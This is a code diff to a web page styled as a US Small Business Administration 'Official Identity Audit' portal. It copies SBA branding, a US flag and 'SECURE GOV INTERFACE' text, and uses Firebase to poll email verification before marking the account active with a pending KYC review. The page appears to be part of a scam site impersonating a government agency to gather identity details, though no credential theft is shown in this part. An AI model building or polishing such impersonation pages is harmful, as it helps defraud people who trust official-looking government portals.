@@ -9,87 +9,89 @@
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;700;900&display=swap');
         :root { --sba-blue: #002e6d; --sba-red: #cc0000; }
-        body { font-family: 'Public Sans', sans-serif; background-color: #f1f5f9; }
+        body { font-family: 'Public Sans', sans-serif; background-color: #f1f5f9; color: #1e293b; }
         
-        .gov-top { background: #f0f0f0; color: #444; font-size: 9px; padding: 6px 15px; border-bottom: 1px solid #ddd; font-weight: 700; }
-        .sba-logo-box { position: relative; display: inline-block; padding: 2px 6px; }
-        .sba-logo-box::before { content: ""; position: absolute; top: 0; left: 0; right: 0; bottom: 4px; border-top: 2px solid var(--sba-blue); border-left: 2px solid var(--sba-blue); border-right: 2px solid var(--sba-blue); }
-        .sba-logo-box::after { content: ""; position: absolute; bottom: 0; left: 0; right: 30%; height: 2px; background: var(--sba-red); }
+        .sba-logo-box { position: relative; display: inline-block; padding: 4px 6px; }
+        .sba-logo-box::before { content: ""; position: absolute; top: 0; left: 0; right: 0; bottom: 4px; border-top: 2.5px solid var(--sba-blue); border-left: 2.5px solid var(--sba-blue); border-right: 2.5px solid var(--sba-blue); }
+        .sba-logo-box::after { content: ""; position: absolute; bottom: 0; left: 0; right: 30%; height: 2.5px; background: var(--sba-red); }
 
-        .auth-card { background: white; border-top: 5px solid var(--sba-blue); box-shadow: 0 4px 20px rgba(0,0,0,0.05); border-radius: 2px; }
-        .btn-sba { background-color: var(--sba-blue); transition: all 0.2s; font-size: 11px; font-weight: 900; letter-spacing: 1px; }
+        .auth-card { background: white; border-top: 5px solid var(--sba-blue); box-shadow: 0 10px 25px rgba(0,0,0,0.1); border-radius: 4px; }
+        
+        /* Mobile Sharp Button */
+        .btn-sba { background: var(--sba-blue); color: white; height: 55px; font-size: 13px; letter-spacing: 1.5px; font-weight: 900; text-transform: uppercase; border-radius: 4px; transition: 0.3s; }
+        .btn-sba:active { transform: scale(0.97); background: #001a3d; }
 
         .verify-pulse { animation: pulse-blue 2s infinite; border-radius: 50%; }
         @keyframes pulse-blue {
             0% { box-shadow: 0 0 0 0 rgba(0, 46, 109, 0.4); }
-            70% { box-shadow: 0 0 0 10px rgba(0, 46, 109, 0); }
+            70% { box-shadow: 0 0 0 15px rgba(0, 46, 109, 0); }
             100% { box-shadow: 0 0 0 0 rgba(0, 46, 109, 0); }
         }
     </style>
 </head>
 <body class="min-h-screen flex flex-col">
 
-    <div class="gov-top flex items-center justify-between uppercase">
-        <div class="flex items-center gap-1.5">
-            <img src="https://upload.wikimedia.org/wikipedia/en/a/a4/Flag_of_the_United_States.svg" class="w-3" alt="US Flag">
-            <span>Official Identity Audit</span>
-        </div>
-        <span class="opacity-40">Node-V15</span>
+    <div class="bg-[#efefef] py-2 px-4 flex items-center gap-2 border-b border-gray-200">
+        <img src="https://upload.wikimedia.org/wikipedia/en/a/a4/Flag_of_the_United_States.svg" class="w-4 shadow-sm">
+        <span class="text-[10px] font-black text-gray-500 uppercase tracking-widest">Official Identity Audit</span>
     </div>
 
-    <header class="bg-white border-b border-gray-100 py-4 px-6 flex justify-center shadow-sm">
+    <nav class="bg-white px-5 py-3 flex justify-center items-center border-b border-gray-100">
         <div class="flex items-center gap-2">
-            <div class="sba-logo-box"><span class="text-lg font-black text-[#002e6d] tracking-tighter uppercase">SBA</span></div>
-            <p class="text-[9px] font-black text-[#002e6d] uppercase leading-none">Administration</p>
+            <div class="sba-logo-box">
+                <span class="text-xl font-black text-[#002e6d] tracking-tighter uppercase">SBA</span>
+            </div>
+            <p class="text-[10px] font-black text-[#002e6d] uppercase leading-none">Administration</p>
         </div>
-    </header>
+    </nav>
 
-    <main class="flex-grow flex items-center justify-center p-4">
-        <div class="w-full max-w-[360px]">
-            <div class="auth-card p-8 border border-gray-200">
+    <main class="flex-grow flex items-center justify-center p-5">
+        <div class="w-full max-w-[420px]">
+            <div class="auth-card p-8">
                 
-                <div class="mb-6 text-center">
-                    <div class="w-14 h-14 bg-slate-50 text-[#002e6d] flex items-center justify-center mx-auto mb-4 border border-[#002e6d] verify-pulse">
-                        <i class="fas fa-user-check text-xl"></i>
+                <div class="mb-8 text-center">
+                    <div class="w-20 h-20 bg-slate-50 text-[#002e6d] flex items-center justify-center mx-auto mb-6 border-2 border-[#002e6d] verify-pulse">
+                        <i class="fas fa-envelope-open-text text-3xl"></i>
                     </div>
-                    <h2 class="text-xl font-black text-slate-800 uppercase tracking-tighter">Account Audit</h2>
-                    <p class="text-slate-400 text-[9px] font-black uppercase tracking-[0.2em] mt-2">Activation Link Dispatched</p>
+                    <h2 class="text-2xl font-black text-slate-800 uppercase tracking-tighter">Account Audit</h2>
+                    <p class="text-slate-400 text-[10px] font-black uppercase tracking-[0.2em] mt-2">Activation Link Dispatched</p>
                 </div>
 
-                <div class="mb-6 text-center bg-slate-50 p-4 border border-slate-100 rounded">
-                    <p class="text-[9px] text-slate-400 font-bold uppercase mb-1">Verify Ownership Of:</p>
-                    <span id="displayEmail" class="text-[#002e6d] text-xs font-black break-all">loading...</span>
+                <div class="mb-6 text-center bg-slate-50 p-5 border border-slate-200 rounded-lg">
+                    <p class="text-[10px] text-slate-400 font-bold uppercase mb-2">Verify Ownership Of:</p>
+                    <span id="displayEmail" class="text-[#002e6d] text-base font-black break-all uppercase tracking-tight italic">loading...</span>
                 </div>
 
-                <div id="alertBox" class="hidden mb-4 p-3 bg-red-50 border-l-4 border-red-600 text-red-700 text-[10px] font-black uppercase italic"></div>
+                <div id="alertBox" class="hidden mb-6 p-4 bg-red-50 border-l-4 border-red-600 text-red-700 text-[11px] font-black uppercase italic shadow-sm"></div>
 
                 <div class="space-y-4">
-                    <div class="p-4 bg-[#001a3d] border border-[#002e6d]">
-                        <p class="text-white text-[10px] font-bold uppercase tracking-wider leading-relaxed text-center">
-                            The system will <span class="text-sky-400">auto-advance</span><br>immediately upon clicking link.
+                    <div class="p-5 bg-[#001a3d] border-l-4 border-sky-400">
+                        <p class="text-white text-[11px] font-bold uppercase tracking-wider leading-relaxed">
+                            <i class="fas fa-bolt text-sky-400 mr-2"></i> SYSTEM STATUS: <span class="text-sky-400">WAITING</span><br>
+                            The portal will auto-advance once the link in your email is clicked.
                         </p>
                     </div>
                     
-                    <button id="checkBtn" class="btn-sba w-full text-white py-4 shadow-lg uppercase">
-                        Manual Refresh
+                    <button id="checkBtn" class="btn-sba w-full shadow-lg">
+                        Manual Refresh Scan
                     </button>
                 </div>
 
-                <div class="mt-8 text-center border-t pt-5 border-slate-50">
-                    <button id="resendBtn" class="text-red-600 font-black text-[10px] uppercase tracking-widest hover:underline">
-                        Resend Security Link
+                <div class="mt-10 text-center border-t pt-6 border-slate-100">
+                    <button id="resendBtn" class="text-[#cc0000] font-black text-[12px] uppercase tracking-widest hover:underline">
+                        <i class="fas fa-paper-plane mr-2"></i> Resend Security Link
                     </button>
                 </div>
             </div>
 
-            <button id="logoutBtn" class="w-full mt-8 text-slate-400 text-[9px] font-black uppercase tracking-[0.4em]">
+            <button id="logoutBtn" class="w-full mt-10 text-slate-400 text-[10px] font-black uppercase tracking-[0.4em] active:text-red-600 transition-colors">
                 <i class="fas fa-power-off mr-2"></i> Terminate Session
             </button>
         </div>
     </main>
 
-    <footer class="py-6 text-center text-[9px] text-slate-400 font-bold uppercase tracking-widest">
-        SECURE GOV INTERFACE © 2026 | Node-15
+    <footer class="py-6 text-center text-[10px] text-slate-400 font-bold uppercase tracking-[0.4em]">
+        SECURE GOV INTERFACE © 2026 | NODE-V15
     </footer>
 
     <script type="module">
@@ -109,7 +111,7 @@
             } else {
                 displayEmail.innerText = user.email;
                 
-                // Real-time automatic checking every 3 seconds
+                // Fast checking every 3 seconds for mobile responsiveness
                 checkInterval = setInterval(async () => {
                     await user.reload();
                     if (user.emailVerified) {
@@ -122,16 +124,15 @@
 
         async function finalizeAudit(user) {
             try {
-                // Update Firestore to mark user as active/verified
                 await updateDoc(doc(db, "users", user.uid), {
                     isVerified: true,
                     accountStatus: "ACTIVE",
-                    kycStatus: "PENDING_REVIEWS" 
+                    kycStatus: "PENDING_REVIEW" 
                 });
                 window.location.href = "welcome.html"; 
             } catch (e) { 
                 console.error("Sync Error:", e);
-                window.location.href = "welcome.html"; // Redirect even if sync delays
+                window.location.href = "welcome.html"; 
             }
         }
 
@@ -140,25 +141,25 @@
             if (!user) return;
             
             checkBtn.disabled = true;
-            checkBtn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> SCANNING...';
+            checkBtn.innerHTML = '<i class="fas fa-circle-notch fa-spin mr-2"></i> SCANNING NODES...';
             
             await user.reload();
             if (user.emailVerified) {
                 finalizeAudit(user);
             } else {
-                alertBox.innerText = "LINK NOT ACTIVATED. CHECK INBOX AND SPAM FOLDERS.";
+                alertBox.innerText = "LINK STATUS: INACTIVE. PLEASE CHECK INBOX/SPAM.";
                 alertBox.classList.remove('hidden');
                 checkBtn.disabled = false;
-                checkBtn.innerText = 'Manual Refresh';
+                checkBtn.innerText = 'Manual Refresh Scan';
             }
         };
 
         document.getElementById('resendBtn').onclick = async () => {
             try {
                 await sendEmailVerification(auth.currentUser);
-                alert("Security Link Resent Successfully.");
+                alert("Security Link Dispatched Successfully.");
             } catch (err) { 
-                alert("Please wait 60 seconds before requesting a new link."); 
+                alert("SECURITY: Please wait 60 seconds before requesting a new link."); 
             }
         };
 
